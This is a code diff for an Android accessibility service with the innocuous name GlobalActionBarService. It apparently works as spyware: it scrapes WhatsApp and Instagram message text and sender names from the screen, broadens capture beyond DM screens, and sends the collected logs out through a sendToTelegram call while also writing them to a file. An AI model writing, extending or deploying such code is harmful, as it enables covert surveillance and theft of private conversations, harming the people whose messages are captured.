@@ -32,6 +32,16 @@ public class GlobalActionBarService extends AccessibilityService {
     private long lastSendTime = 0;
     private String lastSentHash = "";
 
+    // ---- Inner class for message entry ----
+    private static class MessageEntry {
+        String sender;
+        String text;
+        MessageEntry(String sender, String text) {
+            this.sender = sender;
+            this.text = text;
+        }
+    }
+
     // Message text view IDs
     private Set<String> messageTextIds = new HashSet<String>() {{
         add("com.whatsapp:id/message_text");
@@ -45,7 +55,7 @@ public class GlobalActionBarService extends AccessibilityService {
     private Set<String> dmHeaderIds = new HashSet<String>() {{
         add("com.instagram.android:id/direct_message_recipient_name");
         add("com.instagram.android:id/action_bar_title");
-        add("com.instagram.android:id/row_user_name"); // sometimes appears
+        add("com.instagram.android:id/row_user_name");
     }};
 
     // Instagram sender name IDs
@@ -135,12 +145,7 @@ public class GlobalActionBarService extends AccessibilityService {
             if (DEBUG_MODE) {
                 sendToTelegram("📌 DM detection: " + (isDM ? "YES" : "NO"));
             }
-            if (!isDM) {
-                // If not DM, we still might want to capture messages? Let's skip for now.
-                // But we'll also try to extract messages regardless for testing.
-                // Actually, let's still try to extract and see if we get anything.
-                // But we'll only send if we find messages.
-            }
+            // We'll still try to extract messages even if not DM – to see what's there.
         }
 
         // 1. Get contact name (if any)
@@ -159,7 +164,6 @@ public class GlobalActionBarService extends AccessibilityService {
         }
 
         if (messages.isEmpty()) {
-            // Still, for Instagram we might want to capture if it's DM and there are no messages? That's fine.
             return;
         }
 
@@ -177,7 +181,7 @@ public class GlobalActionBarService extends AccessibilityService {
         String fullLog = logBuilder.toString().trim();
         if (fullLog.length() < 30) return;
 
-        // Dedup & cooldown (but for debug, we might want to send every time)
+        // Dedup & cooldown
         String hash = Integer.toHexString(fullLog.hashCode());
         long now = System.currentTimeMillis();
         if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
@@ -190,17 +194,14 @@ public class GlobalActionBarService extends AccessibilityService {
         writeToFile(fullLog);
     }
 
-    // ---- DM Screen Detection (more flexible) ----
+    // ---- DM Screen Detection ----
 
     private boolean isDMScreen(AccessibilityNodeInfo root) {
-        // Check if any DM header ID exists
         for (String id : dmHeaderIds) {
             if (findViewByViewId(root, id) != null) {
                 return true;
             }
         }
-        // Fallback: if there is any text that looks like a username (contains "@" or is short and appears at top)
-        // We'll just rely on IDs for now.
         return false;
     }
 
@@ -290,7 +291,6 @@ public class GlobalActionBarService extends AccessibilityService {
                 entries.add(new MessageEntry(sender, msg));
             }
         } else if (pkg.equals("com.instagram.android")) {
-            // Find all message text nodes
             List<AccessibilityNodeInfo> msgNodes = findAllTextNodes(root, messageTextIds);
             for (AccessibilityNodeInfo node : msgNodes) {
                 String msg = node.getText() != null ? node.getText().toString().trim() : "";
